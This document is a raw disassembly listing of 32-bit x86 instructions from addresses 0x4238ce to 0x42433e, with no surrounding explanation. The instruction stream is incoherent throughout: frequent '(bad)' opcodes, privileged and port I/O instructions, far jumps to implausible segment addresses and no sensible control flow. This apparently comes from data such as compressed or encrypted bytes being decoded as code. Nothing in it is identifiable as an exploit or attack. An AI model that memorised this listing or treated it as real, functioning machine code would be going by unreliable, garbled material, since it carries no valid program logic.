  4238ce:	inc    ebx
  4238cf:	dec    ecx
  4238d0:	sub    al,0x1b
  4238d2:	fimul  WORD PTR [ecx-0x6]
  4238d5:	inc    eax
  4238d6:	cmc    
  4238d7:	cmp    ebp,DWORD PTR [esi]
  4238d9:	pop    eax
  4238da:	sub    ebp,DWORD PTR [esi+0x2]
  4238dd:	daa    
  4238de:	push   0xa30f541a
  4238e3:	call   DWORD PTR [ecx-0x68]
  4238e6:	cld    
  4238e7:	pop    ss
  4238e8:	lds    eax,FWORD PTR [ecx+eiz*1]
  4238eb:	shl    DWORD PTR [eax+0x478a851c],1
  4238f1:	pop    esp
  4238f2:	data16 hlt 
  4238f4:	dec    esp
  4238f5:	pushf  
  4238f6:	mov    al,ds:0x3f1f3a1f
  4238fb:	mul    BYTE PTR [ecx]
  4238fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238fe:	pop    ebx
  4238ff:	mov    dl,0x1f
  423901:	fild   DWORD PTR [ebx+esi*1]
  423904:	pop    edi
  423905:	pop    ss
  423906:	sub    esp,DWORD PTR [ebx+0x5fd0a6e0]
  42390c:	dec    esp
  42390d:	ror    dl,1
  42390f:	pop    ecx
  423910:	inc    edi
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x5ae32bbd
  423982:	add    edx,edi
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0xfa000001,al
  42398d:	mov    esp,0x8b6a4d83
  423992:	lock loop 0x423942
  423995:	sbb    ecx,DWORD PTR [edx-0x554c4e33]
  42399b:	inc    ebp
  42399c:	shl    BYTE PTR [edx+0x63],1
  42399f:	mov    dl,0xcf
  4239a1:	sub    eax,0x71ea5986
  4239a6:	push   esp
  4239a7:	push   ecx
  4239a8:	shl    bl,0xa1
  4239ab:	mov    edi,0x6a604f69
  4239b0:	in     eax,dx
  4239b1:	inc    ecx
  4239b2:	sbb    DWORD PTR [esi+0x65],ebp
  4239b5:	out    0x2,eax
  4239b7:	sub    esp,DWORD PTR [ebx-0x7e]
  4239ba:	bound  esp,QWORD PTR ss:[ebp-0x250adc71]
  4239c1:	cwde   
  4239c2:	cmp    ah,BYTE PTR [edx+0x649a5dc2]
  4239c8:	cli    
  4239c9:	add    BYTE PTR [ecx],al
  4239cb:	pop    ds
  4239cc:	test   al,0xcd
  4239ce:	daa    
  4239cf:	xchg   ebp,eax
  4239d0:	dec    ebp
  4239d1:	add    eax,0xd52a2a70
  4239d6:	int3   
  4239d7:	repz ror BYTE PTR [ebx],1
  4239da:	aas    
  4239db:	jp     0x42397e
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	into   
  4239df:	mov    ecx,0x7205f0a4
  4239e4:	retf   0x6b46
  4239e7:	shl    BYTE PTR [edx-0x78],cl
  4239ea:	daa    
  4239eb:	scas   eax,DWORD PTR es:[edi]
  4239ec:	arpl   WORD PTR [ecx],ax
  4239ee:	jno    0x423a47
  4239f0:	jo     0x42397c
  4239f2:	lock test eax,0xb5578031
  4239f8:	mov    WORD PTR [edi+0x415c9b26],cs
  4239fe:	xchg   esp,eax
  4239ff:	add    esi,eax
  423a01:	mov    cl,0x78
  423a03:	aaa    
  423a04:	jg     0x423a4e
  423a06:	jo     0x423a58
  423a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a09:	inc    BYTE PTR [ecx+ebp*2+0x2f32f0ef]
  423a10:	sahf   
  423a11:	les    eax,FWORD PTR [ebx-0x5f9cc011]
  423a17:	mov    BYTE PTR ds:0xde256e05,0xc5
  423a1e:	adc    al,0x52
  423a20:	xlat   BYTE PTR ds:[ebx]
  423a21:	repnz popf 
  423a23:	xor    DWORD PTR [esi+0x1d],edx
  423a26:	addr16 xchg bl,cl
  423a29:	jb     0x423a6d
  423a2b:	push   edx
  423a2c:	in     eax,0x41
  423a2e:	mov    ebx,0x58bf0995
  423a33:	out    dx,eax
  423a34:	jnp    0x423a45
  423a36:	and    cl,ah
  423a38:	retf   0x5167
  423a3b:	inc    ecx
  423a3c:	adc    BYTE PTR [edx],cl
  423a3e:	inc    ebp
  423a3f:	into   
  423a40:	ret    0xa1c2
  423a43:	pop    ds
  423a44:	xor    cl,BYTE PTR [ecx]
  423a46:	or     DWORD PTR [edx-0x5714a613],eax
  423a4c:	adc    DWORD PTR [eax-0x6],0x3f
  423a50:	hlt    
  423a51:	(bad)  
  423a53:	dec    ebx
  423a54:	adc    al,0x60
  423a56:	iret   
  423a57:	mov    dl,0x18
  423a59:	mov    edx,0x74a1f549
  423a5e:	jns    0x423a06
  423a60:	dec    esp
  423a61:	add    ch,BYTE PTR [ebp+0xfeda4d8]
  423a67:	dec    ebp
  423a68:	test   eax,0x396f2659
  423a6d:	popf   
  423a6e:	outs   dx,BYTE PTR ds:[esi]
  423a6f:	cdq    
  423a70:	xchg   edi,eax
  423a71:	inc    BYTE PTR [ebp+0x469396]
  423a77:	jmp    0x423ad2
  423a79:	leave  
  423a7a:	mov    ebp,0xf03a7b7
  423a7f:	xchg   ecx,eax
  423a80:	retf   0xcd06
  423a83:	in     eax,0x7f
  423a85:	enter  0xad21,0xc1
  423a89:	jmp    0x423a50
  423a8b:	ins    BYTE PTR es:[edi],dx
  423a8c:	lods   al,BYTE PTR ds:[esi]
  423a8d:	int3   
  423a8e:	push   es
  423a8f:	cld    
  423a90:	outs   dx,DWORD PTR ds:[esi]
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	ins    BYTE PTR es:[edi],dx
  423b01:	add    BYTE PTR [edi+0x4],al
  423b04:	and    al,0x7d
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0xf6000001
  423b0d:	idiv   ebx
  423b0f:	xchg   esi,eax
  423b10:	lds    esp,FWORD PTR ds:0x98c12afa
  423b16:	or     BYTE PTR [eiz*1-0x3dd0e5dd],dh
  423b1d:	loop   0x423ad5
  423b1f:	sti    
  423b20:	add    DWORD PTR [esi+edi*8+0x16],esp
  423b24:	mov    ebp,0xeb29abfb
  423b29:	scas   al,BYTE PTR es:[edi]
  423b2a:	sti    
  423b2b:	inc    ebp
  423b2c:	jmp    0x4175f815
  423b31:	adc    eax,0xd096d166
  423b36:	gs and al,0x9e
  423b39:	les    esp,FWORD PTR ds:0xfc62e67c
  423b3f:	test   edi,0xb8541562
  423b45:	sbb    al,0x9c
  423b47:	lock xchg edx,eax
  423b49:	jg     0x423ba8
  423b4b:	stc    
  423b4c:	lods   al,BYTE PTR ds:[esi]
  423b4d:	mov    eax,ds:0x668587f
  423b52:	push   esi
  423b53:	ret    
  423b54:	inc    esp
  423b55:	sub    BYTE PTR [ebx-0x36ccbd68],cl
  423b5b:	xchg   ebp,eax
  423b5c:	adc    eax,0x55569001
  423b61:	dec    edx
  423b62:	pop    ds
  423b63:	mov    ebx,0xb14f267a
  423b68:	js     0x423b1e
  423b6a:	fild   DWORD PTR [esi+0x2a]
  423b6d:	jecxz  0x423b99
  423b6f:	sbb    bh,BYTE PTR [eax+0xf]
  423b72:	dec    eax
  423b73:	sar    DWORD PTR [edx-0x46ee1d0f],cl
  423b79:	sti    
  423b7a:	or     DWORD PTR [eax+0x4c],edx
  423b7d:	pop    esi
  423b7e:	dec    ebx
  423b7f:	ss push esi
  423b81:	inc    edi
  423b82:	aas    
  423b83:	sbb    dh,BYTE PTR [edi]
  423b85:	mul    eax
  423b87:	mov    DWORD PTR [ecx+0x4c],0x97739003
  423b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b8f:	ins    BYTE PTR es:[edi],dx
  423b90:	test   eax,0x67013439
  423b95:	sbb    DWORD PTR [esi-0x2b],ebp
  423b98:	out    dx,eax
  423b99:	sub    DWORD PTR [ecx+0x6f81ee5c],edi
  423b9f:	nop
  423ba0:	in     al,0xf6
  423ba2:	inc    ecx
  423ba3:	sbb    edx,DWORD PTR [edi-0x22]
  423ba6:	pop    ecx
  423ba7:	mov    edi,cr2
  423baa:	lahf   
  423bab:	and    BYTE PTR [edx-0x1b],bh
  423bae:	push   esi
  423baf:	(bad)  
  423bb0:	pop    ecx
  423bb1:	out    dx,eax
  423bb2:	test   esp,ecx
  423bb4:	xchg   BYTE PTR [edx-0x3d],al
  423bb7:	fistp  WORD PTR [ebx-0x6ab3ce0c]
  423bbd:	icebp  
  423bbe:	mov    dh,0x79
  423bc0:	bound  ecx,QWORD PTR es:[edx]
  423bc3:	arpl   ax,bx
  423bc5:	xor    cl,BYTE PTR [edi-0x41]
  423bc8:	int3   
  423bc9:	add    al,0x7c
  423bcb:	push   ecx
  423bcc:	cmp    DWORD PTR [edx-0x30],0x6c
  423bd0:	cmp    cl,BYTE PTR [ebp-0x124c44ae]
  423bd6:	(bad)  
  423bd7:	sub    al,0x49
  423bd9:	xor    edi,ecx
  423bdb:	rcl    BYTE PTR [edx-0x2af6922],cl
  423be1:	jb     0x423c27
  423be3:	inc    ebx
  423be4:	fdiv   QWORD PTR [esi-0x3f]
  423be7:	dec    edi
  423be8:	jmp    0x423be7
  423bea:	cmp    esi,DWORD PTR ds:0xcd55704f
  423bf0:	push   es
  423bf1:	call   DWORD PTR fs:[edi+ebp*4-0x2b]
  423bf6:	mov    al,0x70
  423bf8:	imul   ecx,DWORD PTR [ebp+0x28],0xffffff8d
  423bfc:	mov    edx,0x561fb42b
  423c01:	xor    al,0x9
  423c03:	inc    eax
  423c04:	xchg   BYTE PTR [eax-0x11],ch
  423c07:	dec    esp
  423c08:	retf   0x528
  423c0b:	dec    eax
  423c0c:	jp     0x423be3
  423c0e:	pop    ecx
  423c0f:	push   es
  423c10:	outs   dx,DWORD PTR ds:[esi]
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x53446617]
  423c81:	rcr    BYTE PTR [edx+0x17e29b6],1
  423c87:	add    BYTE PTR ds:0xcf000001,al
  423c8d:	pushf  
  423c8e:	pushf  
  423c8f:	out    0xf0,al
  423c91:	ins    DWORD PTR es:[edi],dx
  423c92:	(bad)  
  423c93:	mov    ds:0x3198969a,al
  423c98:	pushf  
  423c99:	inc    ebx
  423c9a:	gs scas eax,DWORD PTR es:[edi]
  423c9c:	xor    eax,0x67eeae0a
  423ca1:	leave  
  423ca2:	(bad)  
  423ca4:	mov    es,WORD PTR [eax]
  423ca6:	inc    edx
  423ca7:	jne    0x423ca2
  423ca9:	ds and al,0x47
  423cac:	push   eax
  423cad:	cmp    eax,0xc535b504
  423cb2:	(bad)  
  423cb3:	jmp    0x6b84:0x952f1c3f
  423cba:	popa   
  423cbb:	xchg   edi,eax
  423cbc:	gs adc bh,ah
  423cbf:	or     al,al
  423cc1:	xchg   BYTE PTR [ecx],cl
  423cc3:	jae    0x423d39
  423cc5:	retf   
  423cc6:	jmp    0x423d3e
  423cc8:	bound  ebp,QWORD PTR [eax]
  423cca:	test   DWORD PTR [ecx],esi
  423ccc:	push   edi
  423ccd:	test   BYTE PTR ds:0x29dd50d4,bh
  423cd3:	jns    0x423ce9
  423cd5:	adc    DWORD PTR [edx+0xcb8baca],ebx
  423cdb:	inc    ebp
  423cdc:	pop    ebx
  423cdd:	adc    DWORD PTR [edi-0x769dfd64],edi
  423ce3:	nop
  423ce4:	aaa    
  423ce5:	les    esp,FWORD PTR [ecx]
  423ce7:	gs ins BYTE PTR es:[edi],dx
  423ce9:	add    eax,0xfd11eb72
  423cee:	cwde   
  423cef:	xor    edi,esp
  423cf1:	out    0x58,al
  423cf3:	jp     0x423cd9
  423cf5:	fucomp st(2)
  423cf7:	mov    ds:0x657cd529,al
  423cfc:	repnz arpl WORD PTR [edx+0x4b],bp
  423d00:	jns    0x423cdd
  423d02:	mov    eax,0x5e65b1a3
  423d07:	sbb    al,0xbd
  423d09:	and    esi,esi
  423d0b:	stos   BYTE PTR es:[edi],al
  423d0c:	pop    esp
  423d0d:	xchg   BYTE PTR [eax+0x2b],dl
  423d10:	sub    eax,0xaed82f8c
  423d15:	xor    eax,DWORD PTR [esi]
  423d17:	sahf   
  423d18:	sbb    al,BYTE PTR [ecx+0x2c]
  423d1b:	repnz (bad) 
  423d1d:	jge    0x423d33
  423d1f:	in     eax,0x5e
  423d21:	and    al,0x27
  423d23:	sub    dl,bh
  423d25:	or     dh,BYTE PTR [esi-0x53ad99f0]
  423d2b:	cmp    eax,0xa532e193
  423d30:	shl    DWORD PTR [ebp+0x23584daa],1
  423d36:	push   esi
  423d37:	cdq    
  423d38:	and    ch,ah
  423d3a:	cmp    DWORD PTR [eax-0xefb9dbd],0xc795ed31
  423d44:	jl     0x423d9c
  423d46:	push   0xa314db57
  423d4b:	xchg   ecx,eax
  423d4c:	xchg   esi,eax
  423d4d:	imul   ecx,ecx,0x1e
  423d50:	sbb    dl,BYTE PTR [eax-0x43910599]
  423d56:	shr    dh,0xa3
  423d59:	xchg   esi,eax
  423d5a:	push   eax
  423d5b:	out    dx,al
  423d5c:	jno    0x423d4a
  423d5e:	xor    eax,ecx
  423d60:	inc    ebp
  423d61:	pop    edi
  423d62:	js     0x423d94
  423d64:	loopne 0x423d7c
  423d66:	dec    DWORD PTR [ebx-0x39]
  423d69:	sbb    eax,0xe75b1359
  423d6e:	adc    DWORD PTR [ecx-0x49],eax
  423d71:	mov    ebp,0x8291dd8a
  423d76:	xor    ch,BYTE PTR [ecx-0x3e261313]
  423d7c:	fcomip st,st(6)
  423d7e:	or     DWORD PTR [ebx+0x295555bc],edi
  423d84:	jmp    0x297:0x1351cf7c
  423d8b:	dec    edx
  423d8c:	mov    bl,0x92
  423d8e:	in     al,dx
  423d8f:	js     0x423df8
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x13216bd2],esp
  423e03:	out    0x2e,eax
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0xe8000001,al
  423e0d:	xchg   esp,eax
  423e0e:	leave  
  423e0f:	jbe    0x423de4
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	and    al,0x37
  423e14:	adc    al,0x4a
  423e16:	dec    eax
  423e17:	fld    DWORD PTR [ebx-0x57]
  423e1a:	fdiv   QWORD PTR ds:0x78454fd8
  423e20:	data16 out 0x48,al
  423e23:	(bad)  
  423e25:	or     dh,BYTE PTR [esi-0x78]
  423e28:	cmp    al,0x7d
  423e2a:	add    eax,0xb70fb3df
  423e2f:	mov    edi,DWORD PTR [esi-0x54a9cefc]
  423e35:	jle    0x423e74
  423e37:	xor    edi,DWORD PTR [esi]
  423e39:	cli    
  423e3a:	loope  0x423dc6
  423e3c:	int3   
  423e3d:	mov    ch,0x38
  423e3f:	or     ch,ch
  423e41:	xor    eax,0x9f70f436
  423e46:	scas   eax,DWORD PTR es:[edi]
  423e47:	(bad)  
  423e48:	pop    edi
  423e49:	repnz inc esp
  423e4b:	ds pop eax
  423e4d:	shl    BYTE PTR [edx],1
  423e4f:	push   0x468bb383
  423e54:	and    bh,0xd7
  423e57:	es xchg ebx,eax
  423e59:	aad    0x35
  423e5b:	pop    es
  423e5c:	stos   DWORD PTR es:[edi],eax
  423e5d:	fs aam 0xf2
  423e60:	cwde   
  423e61:	inc    edx
  423e62:	mov    ebp,0xda594eaf
  423e67:	push   esi
  423e68:	in     eax,dx
  423e69:	neg    ebx
  423e6b:	push   esi
  423e6c:	or     dl,BYTE PTR [eax-0x3a639d7f]
  423e72:	cmp    eax,0xd20f9d56
  423e77:	fs stos BYTE PTR es:[edi],al
  423e79:	ss cmp ch,al
  423e7c:	imul   edx,DWORD PTR [edx],0x9
  423e7f:	inc    ebx
  423e80:	xor    ch,dl
  423e82:	push   esp
  423e83:	in     eax,dx
  423e84:	sahf   
  423e85:	sbb    BYTE PTR [ebx],bl
  423e87:	enter  0x19a5,0xc1
  423e8b:	fdivr  DWORD PTR ss:[eax+0x4c16762f]
  423e92:	push   eax
  423e93:	ins    DWORD PTR es:[edi],dx
  423e94:	sub    eax,0x908d10b
  423e99:	and    BYTE PTR [ecx],bl
  423e9b:	push   ds
  423e9c:	xchg   ebp,ebp
  423e9e:	leave  
  423e9f:	xor    al,0xc5
  423ea1:	cs mov esi,0xe04d35be
  423ea7:	int    0x14
  423ea9:	outs   dx,DWORD PTR ds:[esi]
  423eaa:	push   edx
  423eab:	std    
  423eac:	inc    ebp
  423ead:	push   eax
  423eae:	fwait
  423eaf:	std    
  423eb0:	jbe    0x423e78
  423eb2:	js     0x423eea
  423eb4:	popf   
  423eb5:	pop    ebp
  423eb6:	pop    ebp
  423eb7:	push   edi
  423eb8:	ret    0xa863
  423ebb:	inc    ebp
  423ebd:	push   0x1b
  423ebf:	inc    ebp
  423ec0:	loope  0x423f29
  423ec2:	jo     0x423eaa
  423ec4:	push   ecx
  423ec5:	iret   
  423ec6:	outs   dx,BYTE PTR ds:[esi]
  423ec7:	ret    
  423ec8:	jno    0x423e53
  423eca:	push   0x61
  423ecc:	aaa    
  423ecd:	cmp    eax,0x4a2963ff
  423ed2:	cmp    eax,0x80ec67c6
  423ed7:	mov    cl,0x88
  423ed9:	pop    es
  423eda:	xchg   BYTE PTR [edx+0x2b1b836e],ah
  423ee0:	adc    eax,0xf17b7618
  423ee6:	add    eax,0xdf2005c7
  423eeb:	(bad)  
  423eec:	(bad)  
  423eed:	sbb    al,dh
  423eef:	rcr    BYTE PTR [esi],1
  423ef1:	das    
  423ef2:	stc    
  423ef3:	jno    0x423f57
  423ef5:	pop    ecx
  423ef6:	cwde   
  423ef7:	das    
  423ef8:	inc    edi
  423ef9:	jne    0x423f0d
  423efb:	es jmp 0x4d69ae6f
  423f01:	cmp    eax,0x8887126
  423f06:	dec    ebp
  423f07:	lods   al,BYTE PTR ds:[esi]
  423f08:	pop    ecx
  423f09:	jb     0x423eea
  423f0b:	inc    ecx
  423f0c:	push   edi
  423f0d:	mov    ebp,0xb90e23
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	dec    esi
  423f81:	retf   0x70f
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	daa    
  423f8d:	pop    ds
  423f8e:	add    dl,dh
  423f90:	bound  ecx,QWORD PTR [ecx+esi*2]
  423f93:	add    BYTE PTR [esi],bl
  423f95:	mov    eax,0x42aa006e
  423f9a:	pop    ecx
  423f9b:	sub    al,0x28
  423f9d:	jnp    0x423fb6
  423f9f:	xor    eax,DWORD PTR [ecx+0x64811c86]
  423fa5:	pop    esp
  423fa6:	push   cs
  423fa7:	pop    esp
  423fa8:	repz rcr DWORD PTR [esi+0x1145a670],1
  423faf:	push   ebp
  423fb0:	mov    cl,0x96
  423fb2:	fist   WORD PTR [eax-0xa]
  423fb5:	xor    BYTE PTR [edx+0x6c],0x43
  423fb9:	int3   
  423fba:	pop    esp
  423fbb:	xchg   esp,eax
  423fbc:	repnz pop ecx
  423fbe:	aad    0x19
  423fc0:	(bad)  
  423fc1:	xor    ecx,ecx
  423fc3:	fnstsw WORD PTR [esi]
  423fc5:	adc    al,0x65
  423fc7:	mov    BYTE PTR [ebp+esi*4-0x60fe5a20],bh
  423fce:	clc    
  423fcf:	adc    dh,BYTE PTR [edx]
  423fd1:	mov    edx,DWORD PTR [ebx+0x1a6ccc18]
  423fd7:	shl    DWORD PTR [ecx],1
  423fd9:	mov    esp,DWORD PTR [ebx+0x51]
  423fdc:	cld    
  423fdd:	(bad)  
  423fdf:	call   0xe217e3d2
  423fe4:	fs sbb al,0x28
  423fe7:	pop    ds
  423fe8:	inc    edi
  423fe9:	mov    edi,0xf4ffed3a
  423fee:	mov    al,ds:0x705c1598
  423ff3:	sbb    bl,al
  423ff5:	fiadd  WORD PTR [eax+0x3b7e84e1]
  423ffb:	out    dx,al
  423ffc:	loop   0x424000
  423ffe:	ins    BYTE PTR es:[edi],dx
  423fff:	and    dl,BYTE PTR [eax]
  424001:	lock loope 0x424051
  424004:	push   0x4a0f80df
  424009:	cli    
  42400a:	jg     0x423fe7
  42400c:	lods   eax,DWORD PTR ds:[esi]
  42400d:	push   ebp
  42400e:	scas   al,BYTE PTR es:[edi]
  42400f:	mov    dh,0x72
  424011:	inc    ebp
  424012:	sbb    DWORD PTR [ebp+0x17c8b428],ebp
  424018:	call   0x65c94d03
  42401d:	std    
  42401e:	xor    dh,bh
  424020:	ret    
  424021:	jle    0x424096
  424023:	add    BYTE PTR [esi],bh
  424025:	in     al,dx
  424026:	mov    ds:0x769aa5e4,al
  42402b:	mov    ds:0xf81e46a5,al
  424030:	jne    0x424050
  424032:	mov    WORD PTR [ebp+ebp*8+0x11],es
  424036:	in     al,dx
  424037:	mov    bl,0xb6
  424039:	jmp    0x321f:0x188c3cb4
  424040:	and    edx,edi
  424042:	mov    ch,0x6a
  424044:	push   esi
  424045:	inc    esp
  424046:	xor    DWORD PTR [esi+0x69],eax
  424049:	sbb    eax,0x8e5969d2
  42404e:	call   0xd51e5a32
  424053:	aad    0x5c
  424055:	shl    BYTE PTR cs:[edi],1
  424058:	call   0x32b37d2b
  42405d:	int    0x8a
  42405f:	adc    eax,0xbe2d791a
  424064:	mov    ebp,0x31e85e9f
  424069:	pushf  
  42406a:	stos   BYTE PTR es:[edi],al
  42406b:	ret    0x9254
  42406e:	mov    esp,0x84241c67
  424073:	cli    
  424074:	je     0x424000
  424076:	sub    al,0x45
  424078:	les    edx,FWORD PTR [eax-0x6]
  42407b:	lds    ecx,FWORD PTR [ebx]
  42407d:	mov    ss,ebp
  42407f:	xchg   ebp,eax
  424080:	xchg   esi,eax
  424081:	(bad)  
  424082:	xor    BYTE PTR es:[ebp+0x43f0f012],dl
  424089:	xchg   esi,eax
  42408a:	int    0x82
  42408c:	loop   0x4240b5
  42408e:	pop    ecx
  42408f:	loop   0x424088
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	lods   eax,DWORD PTR ds:[esi]
  424101:	push   ds
  424102:	and    bh,BYTE PTR [esi]
  424104:	cmp    BYTE PTR [ecx+0x1050001],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	lods   al,BYTE PTR ds:[esi]
  42410d:	ja     0x42411c
  42410f:	mov    ebx,0x8caa26f
  424114:	mov    eax,0xff7e6b4a
  424119:	mov    al,ds:0xa8bb83fa
  42411e:	pop    ss
  42411f:	inc    esp
  424120:	inc    esp
  424121:	dec    esp
  424122:	xchg   edx,eax
  424123:	pop    es
  424124:	js     0x42416c
  424126:	adc    DWORD PTR [eax-0x75a557e7],0xc1086d8a
  424130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424131:	dec    esp
  424132:	cld    
  424133:	les    esi,FWORD PTR [edx+0x63c1a671]
  424139:	jg     0x424128
  42413b:	xchg   esi,eax
  42413c:	push   edi
  42413d:	dec    edi
  42413e:	lahf   
  42413f:	and    BYTE PTR [ebp-0x3b],dh
  424142:	add    eax,0x82d7ef10
  424147:	or     eax,0x8e5ca668
  42414c:	fcom   st(0)
  42414e:	adc    al,al
  424150:	ins    DWORD PTR es:[edi],dx
  424151:	or     al,0x81
  424153:	gs iret 
  424155:	(bad)  
  424156:	in     al,0x83
  424158:	jle    0x4241c9
  42415a:	inc    edi
  42415b:	aad    0xd5
  42415d:	loopne 0x4240ec
  42415f:	ret    0xdace
  424162:	lds    esi,FWORD PTR [ecx-0x59fcab8d]
  424168:	fst    QWORD PTR [eax]
  42416a:	sbb    ecx,esi
  42416c:	xchg   esp,eax
  42416d:	cmp    al,0xd2
  42416f:	call   0x4a8e688
  424174:	xchg   ebx,eax
  424175:	nop
  424176:	inc    edi
  424177:	lock inc esi
  424179:	scas   eax,DWORD PTR es:[edi]
  42417a:	cwde   
  42417b:	mov    al,ds:0x3173eecd
  424180:	(bad)  
  424181:	jmp    0x4241ec
  424183:	push   edi
  424184:	jg     0x4241b8
  424186:	pop    edi
  424187:	cmp    BYTE PTR [edx-0x1bd305dd],cl
  42418d:	aas    
  42418e:	xchg   edi,eax
  42418f:	mov    esi,0xe89fcbcb
  424194:	stc    
  424195:	mov    ah,0x6b
  424197:	xchg   esp,eax
  424198:	int    0x36
  42419a:	int    0xf2
  42419c:	pop    ebx
  42419d:	dec    ebp
  42419e:	or     BYTE PTR ds:0x44c57345,bl
  4241a4:	mov    ebp,0x2238eba4
  4241a9:	(bad)  
  4241aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ab:	cmp    DWORD PTR [edi+0x4e],esi
  4241ae:	push   0xaa85ba1d
  4241b3:	inc    esp
  4241b4:	loope  0x4241bd
  4241b6:	jle    0x4241be
  4241b8:	mov    esi,esi
  4241ba:	retf   
  4241bb:	nop
  4241bc:	or     eax,0xf6e7c91d
  4241c1:	push   eax
  4241c2:	sbb    eax,DWORD PTR [eax]
  4241c4:	jl     0x4241d2
  4241c6:	sub    eax,0x380325db
  4241cb:	sti    
  4241cc:	inc    esp
  4241cd:	repnz cs xchg edi,eax
  4241d0:	clc    
  4241d1:	or     BYTE PTR [edx],0x40
  4241d4:	pop    es
  4241d5:	sub    al,BYTE PTR [edi]
  4241d7:	cs dec edx
  4241d9:	(bad)  
  4241da:	imul   ebp,DWORD PTR [esi],0x304f7248
  4241e0:	andps  xmm7,XMMWORD PTR [eax]
  4241e3:	mov    dl,0x63
  4241e5:	scas   al,BYTE PTR es:[edi]
  4241e6:	xchg   edi,eax
  4241e7:	mov    dh,0xc6
  4241e9:	mov    ds:0x8c10792d,eax
  4241ee:	adc    DWORD PTR [ecx],edi
  4241f0:	popa   
  4241f1:	jne    0x4241bb
  4241f3:	cmp    DWORD PTR [edx],edx
  4241f5:	ret    
  4241f6:	or     DWORD PTR [edx-0x761122be],edx
  4241fc:	and    eax,0x28d5a858
  424201:	fnsave [ebx]
  424203:	cmc    
  424204:	clc    
  424205:	pop    esi
  424206:	pop    esi
  424207:	mov    esp,0xb0cc2ad6
  42420c:	addr16 adc ebx,edx
  42420f:	xchg   DWORD PTR fs:[eax],eax
	...
  424272:	add    BYTE PTR [eax],al
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	adc    dl,BYTE PTR [edx-0x7dc2c5ee]
  424286:	add    DWORD PTR [eax],eax
  424288:	add    eax,0x5000001
  42428d:	sti    
  42428e:	mov    ah,0xb1
  424290:	push   edx
  424291:	push   eax
  424292:	fisttp QWORD PTR [esi-0x33]
  424295:	jecxz  0x424261
  424297:	pusha  
  424298:	imul   ch
  42429a:	mov    al,0x7c
  42429c:	js     0x4242c8
  42429e:	lock lds ebx,FWORD PTR [ecx+0x74]
  4242a2:	ficomp DWORD PTR [ecx-0x69]
  4242a5:	int3   
  4242a6:	sbb    eax,0x7e4945e3
  4242ab:	pop    edx
  4242ac:	xchg   ebx,eax
  4242ad:	push   0x1
  4242af:	icebp  
  4242b0:	sar    DWORD PTR [edi],1
  4242b2:	das    
  4242b3:	mov    ds:0x793133ef,eax
  4242b8:	out    0x2,eax
  4242ba:	and    DWORD PTR [ecx-0x278423b],ebx
  4242c0:	call   0x23b1:0x28bddaec
  4242c7:	shl    BYTE PTR [esi],0x34
  4242ca:	push   0xffffffc2
  4242cc:	mov    ebx,0x2b34a1ef
  4242d1:	test   al,0xc
  4242d3:	xor    ebp,DWORD PTR [eax+ecx*1+0x2e]
  4242d7:	(bad)  
  4242d8:	cmp    eax,0xb321bc76
  4242dd:	gs pop ds
  4242df:	dec    edx
  4242e0:	or     dl,cl
  4242e2:	dec    edi
  4242e3:	push   edx
  4242e4:	repnz and BYTE PTR [ebp+0x23],cl
  4242e8:	cmp    dh,BYTE PTR [ecx+0x73]
  4242eb:	test   BYTE PTR [ebx],bh
  4242ed:	call   0x26ac:0xb8c6b70a
  4242f4:	jo     0x4242e7
  4242f6:	fwait
  4242f7:	int    0x7e
  4242f9:	pop    esi
  4242fa:	xlat   BYTE PTR es:[ebx]
  4242fc:	and    eax,DWORD PTR [ebp+0x72]
  4242ff:	cmp    eax,0x238c014e
  424304:	mov    DWORD PTR [eax+ebp*4-0x3],0x60ea7da9
  42430c:	dec    eax
  42430d:	rep stos BYTE PTR es:[edi],al
  42430f:	and    BYTE PTR [edx-0x30c7d31b],al
  424315:	jo     0x4242c5
  424317:	cmp    eax,0xd20ea234
  42431c:	(bad)  
  42431d:	or     al,0xcd
  42431f:	idiv   DWORD PTR [eax-0x6424aa3f]
  424325:	sti    
  424326:	xor    DWORD PTR [eax],0xf2a4cb76
  42432c:	rcl    bl,0xbb
  42432f:	xchg   edx,eax
  424330:	jno    0x4242e7
  424332:	sbb    al,0x8a
  424334:	les    ebp,FWORD PTR [esi]
  424336:	add    eax,0x4c28d241
  42433b:	dec    edi
  42433c:	xor    ah,BYTE PTR [edi]
  42433e:	adc    eax,0x1e6a979d
